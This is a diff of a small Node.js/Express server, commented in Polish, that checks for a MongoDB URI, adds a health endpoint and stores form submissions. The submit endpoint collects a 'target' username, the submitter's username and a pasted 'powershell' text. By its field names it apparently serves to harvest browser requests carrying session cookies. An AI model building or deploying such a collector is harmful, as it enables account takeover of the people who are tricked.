@@ -3,59 +3,88 @@ const { MongoClient } = require("mongodb");
 require("dotenv").config();
 
 const app = express();
-const PORT = process.env.PORT || 3000;   // ← Render wymaga process.env.PORT
 
+// Render ustawia własny PORT, lokalnie użyje 3000
+const PORT = process.env.PORT || 3000;
+
+// Middleware
 app.use(express.json({ limit: "5mb" }));
 app.use(express.static("public"));
 
+// Sprawdzenie URI MongoDB
+if (!process.env.MONGODB_URI) {
+console.error("❌ Brak MONGODB_URI w zmiennych środowiskowych!");
+process.exit(1);
+}
+
+// Połączenie MongoDB
 const client = new MongoClient(process.env.MONGODB_URI);
 
 async function start() {
-    try {
-        await client.connect();
-        console.log("Połączono z MongoDB!");
+try {
+console.log("⏳ Łączenie z MongoDB...");
 
-        const db = client.db("joinApp");
-        const submissions = db.collection("submissions");
+    await client.connect();
 
-        app.post("/api/submit", async (req, res) => {
-            try {
-                const { targetUsername, yourUsername, powershell } = req.body;
+    console.log("✅ Połączono z MongoDB!");
 
-                if (!targetUsername || !yourUsername || !powershell) {
-                    return res.status(400).json({
-                        error: "Wszystkie pola są wymagane."
-                    });
-                }
+    const db = client.db("joinApp");
+    const submissions = db.collection("submissions");
 
-                const result = await submissions.insertOne({
-                    targetUsername,
-                    yourUsername,
-                    powershell,
-                    createdAt: new Date()
-                });
+    // Endpoint do zapisywania danych
+    app.post("/api/submit", async (req, res) => {
+        try {
+            const {
+                targetUsername,
+                yourUsername,
+                powershell
+            } = req.body;
 
-                res.json({
-                    success: true,
-                    id: result.insertedId
-                });
-
-            } catch (error) {
-                console.error(error);
-                res.status(500).json({
-                    error: "Nie udało się zapisać danych."
+            if (!targetUsername || !yourUsername || !powershell) {
+                return res.status(400).json({
+                    error: "Wszystkie pola są wymagane."
                 });
             }
-        });
 
-        app.listen(PORT, () => {
-            console.log(`Strona działa na porcie ${PORT}`);
-        });
+            const result = await submissions.insertOne({
+                targetUsername,
+                yourUsername,
+                powershell,
+                createdAt: new Date()
+            });
 
-    } catch (error) {
-        console.error("Błąd połączenia z MongoDB:", error);
-        process.exit(1);   // ← lepiej zakończyć proces przy błędzie połączenia
-    }
+            res.json({
+                success: true,
+                id: result.insertedId
+            });
+
+        } catch (error) {
+            console.error("Błąd zapisu do MongoDB:", error);
+
+            res.status(500).json({
+                error: "Nie udało się zapisać danych."
+            });
+        }
+    });
+
+    // Prosty test działania serwera
+    app.get("/api/health", (req, res) => {
+        res.json({
+            status: "ok",
+            database: "connected"
+        });
+    });
+
+    // Uruchomienie serwera
+    app.listen(PORT, "0.0.0.0", () => {
+        console.log(`🚀 Serwer działa na porcie ${PORT}`);
+    });
+
+} catch (error) {
+    console.error("❌ Błąd połączenia z MongoDB:", error);
+    process.exit(1);
+}
+
 }
 
 start();
